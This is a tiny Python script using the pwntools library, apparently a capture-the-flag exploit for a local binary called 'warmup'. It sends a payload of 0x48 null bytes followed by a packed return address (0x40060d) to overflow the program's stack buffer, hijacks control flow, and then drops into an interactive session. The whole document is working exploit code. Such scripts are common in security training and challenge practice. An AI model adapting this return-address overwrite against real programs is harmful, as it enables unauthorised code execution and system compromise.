from pwn import *

target = process('./warmup')

payload = b'\x00'*0x48 +p64(0x40060d)


target.send(payload)

target.interactive()
